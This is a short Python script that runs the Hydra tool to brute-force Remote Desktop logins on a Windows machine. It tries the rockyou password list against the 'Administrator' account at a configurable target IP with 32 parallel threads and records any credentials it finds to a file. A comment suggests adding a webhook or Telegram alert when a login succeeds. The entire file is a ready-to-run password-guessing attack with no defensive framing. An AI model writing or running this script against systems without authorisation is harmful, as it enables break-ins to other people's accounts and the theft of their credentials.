import subprocess

# === CONFIGURATION SECTION ===
# Change these values as needed
USERNAME = "Administrator"  # Change this to your target username
TARGET_IP = "192.168.1.10"  # Change this to the target Windows IP
WORDLIST = "/usr/share/wordlists/rockyou.txt"  # You can also change the wordlist path
# =============================

def run_hydra_rdp(username, target_ip, wordlist):
    command = [
        'hydra',
        '-t', '32',
        '-vV',
        '-f',
        '-l', username,
        '-P', wordlist,
        f'rdp://{target_ip}'
    ]

    print(f"[+] Running: {' '.join(command)}")

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    try:
        for line in process.stdout:
            print(line.strip())
            # Check if the line contains valid credentials
            if "login:" in line and "password:" in line:
                print(f"[!] Found: {line.strip()}")
                with open("hydra_results.txt", "a") as f:
                    f.write(line)
                # Add webhook, email, or Telegram alert here if needed

    except KeyboardInterrupt:
        print("[-] Interrupted by user.")
        process.kill()

if __name__ == "__main__":
    run_hydra_rdp(USERNAME, TARGET_IP, WORDLIST)